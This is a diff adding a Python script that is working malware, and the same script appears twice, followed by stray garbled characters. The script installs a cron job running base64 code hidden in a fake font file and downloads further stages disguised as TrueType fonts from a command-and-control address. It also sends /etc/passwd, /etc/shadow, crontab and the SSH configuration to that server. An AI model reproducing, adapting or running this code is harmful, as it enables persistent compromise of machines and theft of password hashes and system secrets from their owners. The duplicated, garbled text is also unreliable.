@@ -1,0 +1,87 @@
+import inspect
+import requests
+import sys
+from os.path import isfile
+
+EXEC_LINE="/usr/bin/python3 -c 'import base64;exec(base64.b64decode(open(\"/usr/share/fonts/truetype/ComicSans.ttf\").read()))'"
+C2="http://10.10.2.200:110"
+
+def persist():
+    if not isfile("/etc/cron.d/hostname"):
+        with open("/etc/cron.d/hostname", 'a+') as f:
+            f.write( '* * * * * %s' %EXEC_LINE)
+
+def stealer():
+    files = [ "/etc/passwd", "/etc/shadow", "/etc/crontab", "/etc/ssh/sshd_config" ]
+    for e in files:
+        try:
+            with open(e) as f:
+                requests.post(C2+"/exfil", data=f.read())
+        except Exception as e:
+            print(e)
+
+def stage2():
+    st2 = requests.get(C2+"/fonts/ArialBold.ttf")
+    with open("/usr/share/fonts/truetype/ArialBold.ttf", "a+") as f:
+        f.write(st2.text)
+    return
+
+def stage1():
+    st1 = requests.get(C2+"/fonts/ComicSans.ttf")
+    with open("/usr/share/fonts/truetype/ComicSans.ttf", "a+") as f:
+        f.write(st1.text)
+    return
+
+def main():
+    persist()
+    stage1()
+    stage2()
+    stealer()
+
+
+if __name__ == "__main__":
+    exit(main())
+import inspect
+import requests
+import sys
+from os.path import isfile
+
+EXEC_LINE="/usr/bin/python3 -c 'import base64;exec(base64.b64decode(open(\"/usr/share/fonts/truetype/ComicSans.ttf\").read()))'"
+C2="http://10.10.2.200:110"
+
+def persist():
+    if not isfile("/etc/cron.d/hostname"):
+        with open("/etc/cron.d/hostname", 'a+') as f:
+            f.write( '* * * * * %s' %EXEC_LINE)
+
+def stealer():
+    files = [ "/etc/passwd", "/etc/shadow", "/etc/crontab", "/etc/ssh/sshd_config" ]
+    for e in files:
+        try:
+            with open(e) as f:
+                requests.post(C2+"/exfil", data=f.read())
+        except Exception as e:
+            print(e)
+
+def stage2():
+    st2 = requests.get(C2+"/fonts/ArialBold.ttf")
+    with open("/usr/share/fonts/truetype/ArialBold.ttf", "a+") as f:
+        f.write(st2.text)
+    return
+
+def stage1():
+    st1 = requests.get(C2+"/fonts/ComicSans.ttf")
+    with open("/usr/share/fonts/truetype/ComicSans.ttf", "a+") as f:
+        f.write(st1.text)
+    return
+
+def main():
+    persist()
+    stage1()
+    stage2()
+    stealer()
+
+
+if __name__ == "__main__":
+    exit(main())
+∂«´Å
